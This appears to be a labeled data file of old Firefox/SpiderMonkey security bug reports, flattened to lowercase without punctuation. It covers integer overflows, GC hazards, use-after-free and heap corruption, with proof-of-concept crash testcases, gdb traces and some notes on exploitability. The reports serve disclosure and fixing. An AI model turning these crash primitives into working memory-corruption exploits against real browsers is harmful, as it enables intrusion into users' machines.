probably an integer overflow in array_tosource there is probably an integer overflow in array_tosource var o r r r r r r r r r var rr=o.tosource where r occupies 512mb causes this crash 0 in 1 in 2 in from lib/tls/libc.so.6 3 in 4 in nanosleep from lib/tls/libc.so.6 5 in sleep from lib/tls/libc.so.6 6 in ah_crap_handler signum=11 at nssighandlers.cpp:133 7 in nsprofilelock fatalsignalhandler signo=11 at nsprofilelock.cpp:210 8 signal handler called 9 in quotestring sp str quote=34 at opt/joro/firefox/mozilla/js/src/jsopcode.c:438 10 in js_quotestring cx str quote=34 at opt/joro/firefox/mozilla/js/src/jsopcode.c:496 11 in js_valuetosource cx v=141972652 at opt/joro/firefox/mozilla/js/src/jsstr.c:2697 12 in array_join_sub cx obj op=to_source sep rval at opt/joro/firefox/mozilla/js/src/jsarray.c:510 13 in array_tosource cx obj argc=0 argv rval at opt/joro/firefox/mozilla/js/src/jsarray.c:592 14 in js_invoke cx argc=0 flags=0 memory usage is about 600mb and probably can be made smaller	11
integer overflow in jsfun.c function integer overflow in jsfun.c function in js_fun.c for i 0 i n i collect the lengths for all the function-argument arguments arg js_valuetostring cx argv i if arg return js_false argv i string_to_jsval arg args_length jsstring_length arg mark js_arena_mark cx temppool js_arena_allocate_cast cp jschar cx temppool args_length+1 sizeof jschar 64 argv i each occupying 64mb makes 4096mb gdb bt 0 in 1 in 2 in from lib/tls/libc.so.6 3 in 4 in nanosleep from lib/tls/libc.so.6 5 in sleep from lib/tls/libc.so.6 6 in ah_crap_handler signum=11 at nssighandlers.cpp:133 7 in nsprofilelock fatalsignalhandler signo=11 at nsprofilelock.cpp:210 8 signal handler called 9 in function cx obj argc=65 argv rval at opt/joro/firefox/mozilla/js/src/jsfun.c:1854 10 in js_invoke cx argc=65 flags=1 at opt/joro/firefox/mozilla/js/src/jsinterp.c:1311 11 in js_invokeconstructor cx vp argc=65 at opt/joro/firefox/mozilla/js/src/jsinterp.c:1850 12 in js_interpret cx pc result at opt/joro/firefox/mozilla/js/src/jsinterp.c:3405 13 in js_execute cx chain script down flags=0 result at opt/joro/firefox/mozilla/js/src/jsinterp.c:1555 gdb frame 9 9 in function cx obj argc=65 argv rval at opt/joro/firefox/mozilla/js/src/jsfun.c:1854 1854 void js_strncpy cp jsstring_chars arg arg_length current language auto currently c gdb x/i eip function+1654 repz movsb ds esi es edi gdb x/4x edi can not access memory at address gdb x/4x esi gdb	11
probably something badly wrong with js_arena_allocate_cast probably something badly wrong with js_arena_allocate_cast switching to thread 1222125344 lwp 5210 in function cx obj argc=39 argv rval at opt/joro/firefox/mozilla/js/src/jsfun.c:1854 1854 void js_strncpy cp jsstring_chars arg arg_length current language auto currently c gdb x/i eip function+1654 repz movsb ds esi es edi gdb x/4x edi can not access memory at address gdb x/4x edi-16 gdb p n 1 38 gdb p arg_length 2 33554432 gdb p args_length 3 1275068453 gdb gdb p/x args_length 4 gdb bc 2^32 2 38 33554432 1744830464 38 33554432 1275068416 gdb cont continuing program received signal sigsegv segmentation fault switching to thread 1304429648 lwp 5230 in pr_setthreadprivate index=3 priv at opt/joro/firefox/mozilla/nsprpub/pr/src/threads/prtpd.c:208 208 else if self privatedata index pr_tpd_destructors index gdb x/i eip pr_setthreadprivate+340 mov eax eax gdb p/x eax 5 gdb on virgin firefox 1503 from ftp.mozilla.org program received signal sigsegv segmentation fault switching to thread 1222170400 lwp 5249 in gdb x/i eip repz movsb ds esi es edi gdb cont continuing program received signal sigsegv segmentation fault switching to thread 1233278032 lwp 5257 in gdb x/i eip call eax gdb p/x eax 1 gdb	11
string.tosource on a large string causes crash probably due to arena bug string.tosource on a large string causes crash probably due to arena bug 483 bp char s current language auto currently c gdb x/4x bp can not access memory at address	11
browser freeze/crash on this page after few clicks xbl implementation issue m17x ff10 nsxblprototypehandler geteventname nsxblinsertionpoint getdefaultcontent user-agent mozilla/5.0 windows u windows nt 5.1 en-us rv:1.4b gecko/20030513 mozilla firebird/0.6 build identifier mozilla/5.0 windows u windows nt 5.1 en-us rv:1.4b gecko/20030513 mozilla firebird/0.6 directory listing this is a photo-album script which i made a time ago works for older builds moz 1.3 it uses a hidden frame to get the directory listing of the directory of photos you ve chosen also i use a lot of timers and quite some innerhtml the border is generated with an xbl binding when you browse the photo-album after a few clicks two or three at most the browser mozilla 1.4b freezes and will eventually crash i ca n't seem to make a simplified test case i ve tried it in this place this crashes still but by removing the binding it wo n't crash anymore removing any more tags and it wo n't crash anymore or a lot less i m not sure i have posted it before in the mozilla bugs forum i ve managed to squeeze the moments between build moz 1.4a times the build at date 150403 does n't crash mozilla/5.0 windows u windows nt 5.1 en-us rv:1.4b gecko/2003041508 the build at date 160403 does crash mozilla/5.0 windows u windows nt 5.1 en-us rv:1.4b gecko/2003041609 reproducible always steps to reproduce 1.visit page 2.click on some links 3.freeze and eventually crash actual results freeze and crash expected results it should show the pictures with the name of the picture like in mozilla1.3	11
crash involving moz-popup incrementalreflow addcommand mozilla/5.0 macintosh u ppc mac os x mach-o en-us rv:1.9a1 gecko/20050901 firefox/1.6a1 testcase usually crashes while the status bar counter says 2500 filed as security-sensitive becasue the testcase includes code from bug 306939	11
crash when floated html div is removed from math mi parent nsframemanager reresolvestylecontext mozilla/5.0 macintosh u ppc mac os x mach-o en-us rv:1.9a1 gecko/20050908 firefox/1.6a1 i tried making a simpler testcase and was n't able to i think firefox gets itself into a bad/inconsistent state before the crash filing as security-sensitive because the unsimplified testcase uses code from bug 306663	11
crash xpcnativeinterface getname involving frames pad	11
crash involving xul menus position fixed position absolute nsiframe getnextsibling nscssframeconstructor findframewithcontent 0 in nsiframe getnextsibling this at users/admin/trunk/mozilla/layout/base generic/nsiframe.h:676 this means we re playing with deleted memory so this is probably a security hole	11
fix crash with float columns and a feed nsfontmetricsmac init nsunicodefontmappingmac getfontid nsiframe addstatebits nstextstyle nstextstyle this testcase causes a crash with a varying signature and sometimes with a random address on top	11
this testcases causes nsblockframe findlinefor to look at a freed frame steps to reproduce 1 run a firefox build with debug_tracemalloc_framearena defined under valgrind additional setup that probably is n't relevant pear has valgrind 3.1.1 and the firefox build has patches from bug 287116 and bug 184614 to fix other errors valgrind detects 2 load the testcase result valgrind complains about an invalid read on a deleted frame simplified output below will attach more complete output invalid read of size 4 at nsblockframe findlinefor nsiframe by nsblockframe preparechildincrementalreflow nsblockreflowstate by nsblockframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned address is 48 bytes inside a block of size 52 free d at free vg_replace_malloc.c:235 by pr_free by framearena freeframe unsigned void by presshell freeframe unsigned void by nsframe destroy by nssplittableframe destroy	11
crash in nsvoidarray count called by nscellmap rebuildconsideringrows pad	11
crash nstablecolgroupframe getstartcolumnindex pad	11
crash nsiframe getstyledata called by nstablerowframe collapserowifnecessary pad	11
multiple tfoot cellmap crash nscellmap getcellinfoat we access deleted memory the testcase works only with latest trunk	11
crash when closing window while tooltip is about the be shown or hidden testcase and possible patch coming marking security sensitive since this is about accessing deleted objects	11
dom cellmap crash the testcase tries to access foo 1 or foo marking sensitive	11
still content can implement tree views see bug 326501 nsinativetreeview check introduced by said bug can be circumvented by using treeelement.boxobject.setpropertyassupports	11
fix crash nsiview destroy on 1.8.0.5 and 1.8.1 branch see upcoming testcase which crashes 1.8.0.5 branch and 1.8.1 branch it does n't crash current trunk build if desired i can reduce the testcase which i ll atttach shortly talkback id tb20839728g nsiview destroy c builds/tinderbox/fx-mozilla1.8/winnt_5.2_depend/mozilla/view/src/nsview.cpp line 305 nssplittableframe destroy c builds/tinderbox/fx-mozilla1.8/winnt_5.2_depend/mozilla/layout/generic/nssplittableframe.cpp line 71 nsblockframe destroy c builds/tinderbox/fx-mozilla1.8/winnt_5.2_depend/mozilla/layout/generic/nsblockframe.cpp line 317 nslinebox deletelinelist c builds/tinderbox/fx-mozilla1.8/winnt_5.2_depend/mozilla/layout/generic/nslinebox.cpp line 325 nslinebox deletelinelist c builds/tinderbox/fx-mozilla1.8/winnt_5.2_depend/mozilla/layout/generic/nslinebox.cpp line 325 nslinebox deletelinelist c builds/tinderbox/fx-mozilla1.8/winnt_5.2_depend/mozilla/layout/generic/nslinebox.cpp line 325 nslinebox deletelinelist c builds/tinderbox/fx-mozilla1.8/winnt_5.2_depend/mozilla/layout/generic/nslinebox.cpp line 325 nslinebox deletelinelist c builds/tinderbox/fx-mozilla1.8/winnt_5.2_depend/mozilla/layout/generic/nslinebox.cpp line 325 nslinebox deletelinelist c builds/tinderbox/fx-mozilla1.8/winnt_5.2_depend/mozilla/layout/generic/nslinebox.cpp line 325 nslinebox deletelinelist c builds/tinderbox/fx-mozilla1.8/winnt_5.2_depend/mozilla/layout/generic/nslinebox.cpp line 325 nsblockframe doremoveframe c builds/tinderbox/fx-mozilla1.8/winnt_5.2_depend/mozilla/layout/generic/nsblockframe.cpp line 5718 nsblockframe removeframe c builds/tinderbox/fx-mozilla1.8/winnt_5.2_depend/mozilla/layout/generic/nsblockframe.cpp line 5510 nsframemanager removeframe c builds/tinderbox/fx-mozilla1.8/winnt_5.2_depend/mozilla/layout/base/nsframemanager.cpp line 705 nscssframeconstructor contentremoved c builds/tinderbox/fx-mozilla1.8/winnt_5.2_depend/mozilla/layout/base/nscssframeconstructor.cpp line 10071 nscssframeconstructor reinsertcontent c builds/tinderbox/fx-mozilla1.8/winnt_5.2_depend/mozilla/layout/base/nscssframeconstructor.cpp line 9611 nscssframeconstructor mayberecreatecontainerforibsplitterframe c builds/tinderbox/fx-mozilla1.8/winnt_5.2_depend/mozilla/layout/base/nscssframeconstructor.cpp line 11891 nscssframeconstructor restyleelement c builds/tinderbox/fx-mozilla1.8/winnt_5.2_depend/mozilla/layout/base/nscssframeconstructor.cpp line 10503 nscssframeconstructor processonerestyle c builds/tinderbox/fx-mozilla1.8/winnt_5.2_depend/mozilla/layout/base/nscssframeconstructor.cpp line 13944 nscssframeconstructor processpendingrestyles c builds/tinderbox/fx-mozilla1.8/winnt_5.2_depend/mozilla/layout/base/nscssframeconstructor.cpp line 13992 presshell flushpendingnotifications c builds/tinderbox/fx-mozilla1.8/winnt_5.2_depend/mozilla/layout/base/nspresshell.cpp line 5338 nsdocument flushpendingnotifications c builds/tinderbox/fx-mozilla1.8/winnt_5.2_depend/mozilla/content/base/src/nsdocument.cpp line 4272 nshtmldocument flushpendingnotifications c builds/tinderbox/fx-mozilla1.8/winnt_5.2_depend/mozilla/content/html/document/src/nshtmldocument.cpp line 1271 nshtmlexternalobjsh getplugininstance c builds/tinderbox/fx-mozilla1.8/winnt_5.2_depend/mozilla/dom/src/base/nsdomclassinfo.cpp line 8768 nshtmlexternalobjsh postcreate c builds/tinderbox/fx-mozilla1.8/winnt_5.2_depend/mozilla/dom/src/base/nsdomclassinfo.cpp line 8828 xpcwrappednative getneworused c builds/tinderbox/fx-mozilla1.8/winnt_5.2_depend/mozilla/js/src/xpconnect/src/xpcwrappednative.cpp line 467 xpcconvert nativeinterface2jsobject c builds/tinderbox/fx-mozilla1.8/winnt_5.2_depend/mozilla/js/src/xpconnect/src/xpcconvert.cpp line 1156 nsxpconnect wrapnative c builds/tinderbox/fx-mozilla1.8/winnt_5.2_depend/mozilla/js/src/xpconnect/src/nsxpconnect.cpp line 592 nseventlistenermanager compileeventhandlerinternal c builds/tinderbox/fx-mozilla1.8/winnt_5.2_depend/mozilla/content/events/src/nseventlistenermanager.cpp line 1507 nseventlistenermanager handleeventsubtype c builds/tinderbox/fx-mozilla1.8/winnt_5.2_depend/mozilla/content/events/src/nseventlistenermanager.cpp line 1643 nseventlistenermanager handleevent c builds/tinderbox/fx-mozilla1.8/winnt_5.2_depend/mozilla/content/events/src/nseventlistenermanager.cpp line 1762 nsgenericelement handledomevent c builds/tinderbox/fx-mozilla1.8/winnt_5.2_depend/mozilla/content/base/src/nsgenericelement.cpp line 2223 nsgenericelement handledomevent c builds/tinderbox/fx-mozilla1.8/winnt_5.2_depend/mozilla/content/base/src/nsgenericelement.cpp line 2248 nseventstatemanager dispatchmouseevent c builds/tinderbox/fx-mozilla1.8/winnt_5.2_depend/mozilla/content/events/src/nseventstatemanager.cpp line 2687 nseventstatemanager notifymouseover c builds/tinderbox/fx-mozilla1.8/winnt_5.2_depend/mozilla/content/events/src/nseventstatemanager.cpp line 2812 nseventstatemanager generatemouseenterexit c builds/tinderbox/fx-mozilla1.8/winnt_5.2_depend/mozilla/content/events/src/nseventstatemanager.cpp line 2844 nseventstatemanager prehandleevent c builds/tinderbox/fx-mozilla1.8/winnt_5.2_depend/mozilla/content/events/src/nseventstatemanager.cpp line 523 presshell handleeventinternal c builds/tinderbox/fx-mozilla1.8/winnt_5.2_depend/mozilla/layout/base/nspresshell.cpp line 6373 presshell handleevent c builds/tinderbox/fx-mozilla1.8/winnt_5.2_depend/mozilla/layout/base/nspresshell.cpp line 6215 nsviewmanager handleevent c builds/tinderbox/fx-mozilla1.8/winnt_5.2_depend/mozilla/view/src/nsviewmanager.cpp line 2559 nsviewmanager dispatchevent c builds/tinderbox/fx-mozilla1.8/winnt_5.2_depend/mozilla/view/src/nsviewmanager.cpp line 2246 handleevent c builds/tinderbox/fx-mozilla1.8/winnt_5.2_depend/mozilla/view/src/nsview.cpp line 174 nswindow dispatchevent c builds/tinderbox/fx-mozilla1.8/winnt_5.2_depend/mozilla/widget/src/windows/nswindow.cpp line 1349 nswindow dispatchmouseevent c builds/tinderbox/fx-mozilla1.8/winnt_5.2_depend/mozilla/widget/src/windows/nswindow.cpp line 6213 childwindow dispatchmouseevent c builds/tinderbox/fx-mozilla1.8/winnt_5.2_depend/mozilla/widget/src/windows/nswindow.cpp line 6460 nswindow windowproc c builds/tinderbox/fx-mozilla1.8/winnt_5.2_depend/mozilla/widget/src/windows/nswindow.cpp line 1538 user32.dll user32.dll user32.dll user32.dll nsappshell run c builds/tinderbox/fx-mozilla1.8/winnt_5.2_depend/mozilla/widget/src/windows/nsappshell.cpp line 159 nsappstartup run c builds/tinderbox/fx-mozilla1.8/winnt_5.2_depend/mozilla/toolkit/components/startup/src/nsappstartup.cpp line 152 main c builds/tinderbox/fx-mozilla1.8/winnt_5.2_depend/mozilla/browser/app/nsbrowserapp.cpp line 61 kernel32.dll	11
columns crash nslinebox deletelinelist with moz-column-count and generated content see upcoming testcase which crashes current trunk build and firefox1.5.05 talkback id tb20910283z nslinebox deletelinelist nsblockframe doremoveframe nsblockframe removeframe nsframemanager removeframe nscachedstyledata destroy i m afraid it window size dependant so the testcase contains a window.resizeto 1440 600 function your browser should allow the resize	11
yet another unrooted atom in jsarray.c the fix for bug 341956 missed the hazard in array_shift there id for the last element is accessed after changing the element before that so a setter there can trigger gc which would collect the last id fortunately this is only exploitable on 64bit computer with tens of gigabyte of memory due to bug 345961 due to that bug a sparse array would be turned into dense one during shift loop thus the loop can only start to produce atoms when the array would have at least jsval_int_max 2 or 2^30 1 elements that is not possible to allocate with 32-bit cpu and on 64-bit one just the slot array would take 8gb of memory plus the slot map hashtable overhead but if one fixes bug 345961 or if one can find a host object where a setter by default for indexes would do nothing but where one can set object.length to any value then something like the following can expose the bug after a few minutes var jsval_int_max 1 30 1 var a new array jsval_int_max 2 a jsval_int_max 0 a jsval_int_max 1 1 a.__definegetter jsval_int_max function return 0 a.__definesetter jsval_int_max function value delete a jsval_int_max 1 var tmp tmp jsval_int_max 2 2 if typeof gc function gc for var i 0 i 50000 i var tmp 1 3 tmp 10 for var i 0 i 1000 i make string with 11 characters that would take 11 1 2 bytes or sizeof jsatom so eventually malloc will ovewrite just freed atoms var tmp2 array 12 join a.shift var expected 0 var actual a jsval_int_max if expected actual print bad	11
problematic branch callback calls from the last ditch gc the last ditch gc must preserve cx newborn array and keep all atoms but as far as i can see calling branch callback can break this since there is very little restrictions on what the callback can do in particular it can call and js_maybegc or even js_gc wiping out all newborn arrays in particular the branch callback in the browser 654 calls js_maybegc and potentially install the debugger the former would gc all newborns with way_too_much_gc defined when js_maybegc is just js_gc and the later afaics can allocate gc things this is the reason i mark the bug as a security problem this has to be addressed somehow the simplest and imo the best option would be just to disable the callback on the last ditch gc instead explicit calls to the callback should be issued from other points where it is safe to call the callback	11
branch patch for cellmap i fixed a couple of bugs blocking bug 339128 on trunk imho the patches should be ported to 1.8.1 i do n't see any point in cherry picking the patches all of them lead to crashes i will do the patch today or tomorrow so that it can be pushed towards branches	11
frames not destroyed involves mtable and mtd reloading this testcase causes my debug build to hit an assertion i added locally which checks that no frames are lost when a framearena is destroyed patch in bug 334514 marking as sg critical because i have a slightly larger testcase that causes a debug build of firefox to crash accessing memory at the testcase i m attaching does not crash at all it only triggers the assertion	11
fix frames not destroyed with this xbl td testcase 1 load either testcase result assertion unsupported operation pr_false nstablecellframe appendframes 2 reload result assuming the patch from 334514 is applied you ll see another assertion some frame destructors were not called result if you re using the crashing testcase you re likely to see a crash attempting to dereference	11
crash nsarraysh getproperty with stirtable and removestyles stuff and removing iframe pad	11
xsltprocessor.setparameter f3ck array causes heap trouble xsltprocessor.setparameter f3ck array causes heap trouble probably either heap overflow or wild pointers on trunk 2.0 and 1.5 glibc detected free invalid next size fast	11
integer overflow when constructing error.stack the code to construct error.stack property in initexceptionobject from jsexn.c does not check for a possible integer overflow when reallocating stackbuf array the overflow happens when a sufficiently huge string is present as argument multiple times on the stack in this case the code would include its text multiple times since the buffer grows as a power of 2 at some point with sufficient memory more than 2gb stackmax will be increased from 2^30 to 2^31 then on 32 bit cpu the line js_realloc cx stackbuf stackmax+1 sizeof jschar would allocate 2^31+1 sizeof jschar 2^32 or just 2 bytes when realloc returns a pointer p to such chunk the code would starting from at p+2gb address a user-controllable data	11
crash/hang nslinebox removeplaceholderdescendantsof ntdll.dll on avrev.com with adblock plus 0.7.1.1 enabled user-agent mozilla/5.0 windows u windows nt 5.1 en-us rv:1.8.1b1 gecko/20060814 bonecho/2.0b1 build identifier mozilla/5.0 windows u windows nt 5.1 en-us rv:1.8.1b1 gecko/20060814 bonecho/2.0b1 when i visit avrev.com with adblock plus enabled bon echo hangs or crashes disabling adblock plus allows the site to work correctly reproducible always steps to reproduce 1 visit avrev.com with adblock plus enabled 2 if bon echo does not immediately hang or crash try clicking a link using crash2 i have this talkback id tb22100260k	11
fix crash nsrulenode getparentdata with first-letter anonymous content and removing styles see upcoming testcase which crashes for me on load usually it crashes for me the first time if it does n't try reloading a few times talkback id tb22114083k nsrulenode getparentdata nsstylecontext getstyledata nsrulenode walkruletree nsrulenode getvisibilitydata this is a regression it does n't crash in a 2004-10-29 build it crashes in a 2005-05-06 build	11
crash nsframelist destroyframes on reload with moz-column-count moz-inline-block and blockquote first-letter see upcoming testcase which crashes mozilla on reload it crashes with current trunk builds with firefox1.5.0.6 but not with mozilla1.7.13 talkback id tb22162189z nsframelist destroyframes nslinebox deletelinelist nsframelist destroyframes nslinebox deletelinelist nslinebox deletelinelist nsframelist destroyframes canvasframe destroy nsframelist destroyframes nsframelist destroyframes nsframemanager destroy documentviewerimpl destroy documentviewerimpl show nsprescontext ensurevisible presshell unsuppressandinvalidate presshell unsuppresspainting	11
crash xulpopuplistenerimpl closepopup nsxulpopuplistener keeps a weak reference to the popup bad things happen if popup is deleted before the listener testcase and patch coming	11
accessing wrong stack slot with nested catch/finally consider the following example for js shell var finally1 ex function gen try try throw 1 catch e yield 1 finally finally1 true catch e ex e finally1 false var iter gen iter.next try iter.throw 1 catch e if e instanceof stopiteration var passed finally1 ex 1 if passed print failed print finally1 finally1 print ex uneval ex currently the shell prints when executing the example failed finally1=true ex=67853518 where ex=67853518 comes from the wrong value poped from the stack when finishing execution of inner finally	11
crash involving nested elements with style display moz-grid-group nsgridrowlayout getgrid mozilla/5.0 macintosh u ppc mac os x mach-o en-us rv:1.9a1 gecko/20050908 firefox/1.6a1 filing as security-sensitive because the testcase includes code from bug 306939 and i did n't manage to make a simplified testcase	11
crash nsbidipresutils resolve nscachedstyledata getstyledata filing as security-sensitive because i believe the crash is exploitable before i reduced the testcase i got similar stack traces with large non-zero numbers on top instead of zero on top	11
fix crash nsstylecontext findchildwithrules with first-line appending rows and table-cells etc see upcoming testcase which crashes current branch 1.8.0.x and 1.8.1 and trunk builds it does n't crash mozilla1.7.13 this seems to have regressed between 2005-01-03 and 2005-01-04 maybe a regression from bug 271422 somehow talkback id tb22561642m nsstylecontext findchildwithrules nsstyleset getcontext nsstyleset reparentstylecontext nsframemanager reparentstylecontext nsfirstlineframe pulloneframe nslinelayout reflowframe i have several in-between testcases that crash in different areas mostly in the style system i can attach those if wanted	11
crash nscssrendering paintbackgroundwithsc with colspan=0 this testcase causes a scary crash in a debug build the memory address accessed looks random not something like or examples stack trace 0 nscachedstyledata getstyledata nsstylestructid const 92 nsrulenode.h:215 1 nsstylecontext getstyledata nsstylestructid 52 nsstylecontext.cpp:221 2 nsiframe getstyledata nsstylestructid const 108 nsiframe.h:591 3 nsiframe getstyledisplay const 36 nsstylestructlist.h:95 4 nscssrendering paintbackgroundwithsc nsprescontext nsirenderingcontext nsiframe nsrect const nsrect const nsstylebackground const nsstyleborder const nsstylepadding const int nsrect 176 nscssrendering.cpp:2902 5 tablebackgroundpainter paintcell nstablecellframe int 572 nstablepainter.cpp:599	11
gc hazard when copying jserrorreport exn_newprivate from js/src/jsexn.c contains the following code we do n't need to copy linebuf and tokenptr because they point into the deflated string cache currently newreport linebuf report linebuf newreport tokenptr report tokenptr this is wrong since for example any finally block can trigger gc before the error is reported gc then releases the cache leading later to accessing of freed memory in the error handler for example consider the following example for js shell var invalid_script array 1 12 join n bad bad bad try function invalid_script finally try function invalid_script catch e gc when the line gc is commented out the shell prints m/trunk/mozilla/js/src linux_all_dbg.obj/js s/x.js home/igor/s/x.js:4099 syntaxerror missing before statement home/igor/s/x.js:4099 bad bad bad home/igor/s/x.js:4099 with gc call present the result is m/trunk/mozilla/js/src linux_all_dbg.obj/js s/x.js before 9232 after 9232 break 0819c000 home/igor/s/x.js:4099 syntaxerror missing before statement home/igor/s/x.js:4099 home/igor/s/x.js:4099 i.e the shell is accessing freed memory when it prints the error report	11
x causes assertion failure js_uptrdiff fp sp fp spbase depthdiff at jsinterp.c:392 steps to reproduce in a debug build javascript x result assertion failure js_uptrdiff fp sp fp spbase depthdiff at jsinterp.c:392	11
crash if formal parameter and inner function have the same name js_decompilefunction javascript function s function s causes a scary crash at least in a debug build of firefox exception exc_bad_access codes kern_invalid_address at thread 0 crashed 0 js_decompilefunction 996 jsopcode.c:3258 1 js_decompilefunction 140 jsapi.c:4222 2 js_fun_tostring 2008 jsfun.c:1476 3 fun_tostring 68 jsfun.c:1486 4 js_invoke 4912 jsinterp.c:1350 5 js_internalinvoke 444 jsinterp.c:1448 6 js_trymethod 416 jsobj.c:4534 7 js_defaultvalue 112 jsobj.c:3809 8 js_valuetostring 152 jsstr.c:2681 9 js_valuetostring 40 jsapi.c:535 10 jsvaluetoastring jscontext long nsastring_internal int 116 nsjsenvironment.cpp:1160 11 nsjscontext evaluatestring nsastring_internal const void nsiprincipal char const unsigned unsigned nsastring_internal int 1612 nsjsenvironment.cpp:1322 12 nsjsthunk evaluatescript nsichannel 2844 nsjsprotocolhandler.cpp:255	11
gc hazard with unrooted ids in object.tosource consider the following example for js shell function removeallproperties o for var prop in o delete o prop for var i 0 i 50 1000 i var tmp math.sqrt i+0.2 tmp 0 if typeof gc function gc function test var o o.first tosource function removeallproperties o for var i 0 i 10 i o math.sqrt i 0.1 1 return o.tosource print test when executed it crashes the shell build/1.8.1/dbg/dist/bin run-mozilla.sh xpcshell s/x.js type manifest file home/igor/build/1.8.1/dbg/dist/bin/components/xpti.dat nsnativecomponentloader autoregistering begins nsnativecomponentloader autoregistering succeeded nsnativecomponentloader registering deferred 0 before 913968 after 9232 break 08127000 run-mozilla.sh line 131 10065 segmentation fault prog 1 the reason for the crash is that js_entersharpobject returns an array of property ids and nothing roots the atoms that can present in the array thus the gc triggered either through explicit gc call shell or a branch callback browser would lead to accessing the freed memory in object.tosource when properties are removed during the string assembling loop	11
crash dereferencing reportcompileerrornumber called from checkdestructuring js window.x getter t for each a v in segmentation fault js window.x getter t for each a v program received signal exc_bad_access could not access memory reason kern_invalid_address at address in reportcompileerrornumber cx handle flags=512 errornumber=102 report charargs=1 ap h at jsscan.c:571 571 js_assert ts ts linebuf.limit ts linebuf.base js_line_limit gdb bt 0 in reportcompileerrornumber cx handle flags=512 errornumber=102 report charargs=1 ap h at jsscan.c:571 1 in js_reportcompileerrornumber cx handle flags=512 errornumber=102 at jsscan.c:710 2 in checkdestructuring cx data left right tc at jsparse.c:2212 3 in primaryexpr cx ts tc tt=tok_lb afterdot=0 at jsparse.c:5299 4 in memberexpr cx ts tc allowcallsyntax=1 at jsparse.c:4231 5 in unaryexpr cx ts tc at jsparse.c:4141 6 in mulexpr cx ts tc at jsparse.c:3984 7 in addexpr cx ts tc at jsparse.c:3966	11
crash js_getgcthingflags involving post-decrement operator js y tostring gc new function y causes a crash js_getgcthingflags at the line offsetinarena pi offsetinarena gdb says thing pi jsgcpageinfo i can get a similar crash without the tostring gc thing if i enable way_too_much_gc	11
gc hazard with xml_getmethod consider the following example var set new xml a b text b a children b var counter 0 object.prototype.unrooter getter function counter if counter 5 set 0 new xml c if typeof gc function gc var tmp math.sqrt 2 tmp2 for i 0 i 50000 i tmp2 tmp 2 return undefined set.unrooter currently it crashes when accessing gc-ed xml object this happens because xml_getmethod does not root the first child of xml-list when it searches for a method there the script exploits it defining a getter in object.prototype that at the right moment removes the child from the list cutting all its roots thus the following forced gc collects the child leading to a crash during tostring conversion of the child	11
wrong assumptions about immutable xml consider the following example var xml var n 10 for var i 0 i n i xml i a i function prepare for var i n 1 i 0 i delete xml i gc return test xml n 1 tostring prepare currently it crashes the shell since putproperty in jsxml.c assumes that after ensuring that the insert index is less then the list length the list length would not change this is wrong since the code later convert the passed value to string which can execute arbitrary scrip code that modifies the list in the above example the crash happens when accessing null pointer but its modification can be used to reinterpret as xml object arbitrary script-controlled memory	11
bad assumptions about array elements in jsxml.c consider the following example function getter return 1 function setter v return v var xml a xmlns foo bar array.prototype.__definegetter 0 getter array.prototype.__definesetter 0 setter xml.namespace currently it crashes because xml_inscopenamespaces assumes that array instance may only contain array elements it explicitly put there as this example demonstrates this is not the case since script can define a getter on array.prototype	11
crash js_invoke quotestring with export/import and setter js this.x setter function export t this new function import t import t segmentation fault exception exc_bad_access codes kern_invalid_address at thread 0 crashed 0 js quotestring 176 jsopcode.c:468 1 js js_quotestring 132 jsopcode.c:555 2 js js_valuetosource 76 jsstr.c:2688 3 js js_decompilevaluegenerator 3868 jsopcode.c:4748 4 js js_reportisnotfunction 220 jsfun.c:2241 5 js js_invoke 4712 jsinterp.c:1436 6 js js_internalinvoke 444 jsinterp.c:1467 7 js js_internalgetorset 552 jsinterp.c:1527 8 js js_setproperty 2804 jsobj.c:3631 9 js importproperty 1524 jsinterp.c:1730 10 js js_interpret 85440 jsinterp.c:4718 11 js js_execute 936 jsinterp.c:1618 12 js js_executescript 64 jsapi.c:4256 13 js process 904 js.c:265 14 js processargs 2304 js.c:487 15 js main 640 js.c:3088 16 js start 340 crt.c:272 17 js start 60	11
strange crash in svg scale transform int overflow strange crash in svg scale transform int overflow there is a strange svg crash may be due to integer overflow the following crashes in memset on linux text font-size 20 transform scale 16385,16385 feck text testcase to follow both 1.5 and trunk crash	11
firefox 1.5.0.2 topcrash nsexpatdriver parsebuffer crashes at nsexpatdriver parsebuffer are one of the close-to-the-top crashes in firefox 1.5.0.2 unfortunately talkback does n't provide very much useful information see the above url for most of what it does have pretty much all the crashes are on windows so it is possible they re showing up under another signature on other platforms	11
fix out of bounds and crash removing an attribute during a mutation event for its removal nsattrandchildarray removeattrat nsattrname releaseinternalname loading the testcase causes a crash in trunk nightlies and debug builds the testcase is similar to the one for bug 338391 but attributes take the place of nodes	11
crash access after delete nsmenuframe can be deleted during nsmenuframe handleevent user-agent mozilla/5.0 x11 u linux i686 en-us rv:1.8.0.6 gecko/20060728 firefox/1.5.0.6 build identifier cvs trunk as of august 9th also mozilla 1.5.0.6 there are several ways this can happen one of which can be consistently reproduced with my testcase backtrace looks like this 5 signal handler called 6 in 7 in nsmenuframe openmenuinternal this aactivateflag=1 at home/amil082/mozilla_trunk/mozilla/layout/xul/base/src/nsmenuframe.cpp:760 8 in nsmenuframe openmenu this aactivateflag=1 at home/amil082/mozilla_trunk/mozilla/layout/xul/base/src/nsmenuframe.cpp:733 9 in nsmenuframe togglemenustate this at home/amil082/mozilla_trunk/mozilla/layout/xul/base/src/nsmenuframe.cpp:544 10 in nsmenuframe handleevent this aprescontext aevent aeventstatus at home/amil082/mozilla_trunk/mozilla/layout/xul/base/src/nsmenuframe.cpp:404 11 in nspresshelleventcb handleevent this avisitor at home/amil082/mozilla_trunk/mozilla/layout/base/nspresshell.cpp:1484 12 in nseventtargetchainitem handleeventtargetchain this avisitor aflags=6 acallback at home/amil082/mozilla_trunk/mozilla/content/events/src/nseventdispatcher.cpp:476 13 in nseventdispatcher dispatch atarget aprescontext aevent adomevent aeventstatus acallback atargetischromehandler=0 at home/amil082/mozilla_trunk/mozilla/content/events/src/nseventdispatcher.cpp:639 14 in presshell handleeventinternal this aevent aview astatus at home/amil082/mozilla_trunk/mozilla/layout/base/nspresshell.cpp:6229 15 in presshell handlepositionedevent this aview atargetframe aevent aeventstatus at home/amil082/mozilla_trunk/mozilla/layout/base/nspresshell.cpp:6104 16 in presshell handleevent this aview aevent aeventstatus at home/amil082/mozilla_trunk/mozilla/layout/base/nspresshell.cpp:5932 17 in nsviewmanager handleevent this aview apoint aevent acaptured=0 at home/amil082/mozilla_trunk/mozilla/view/src/nsviewmanager.cpp:1662 18 in nsviewmanager dispatchevent this aevent astatus at 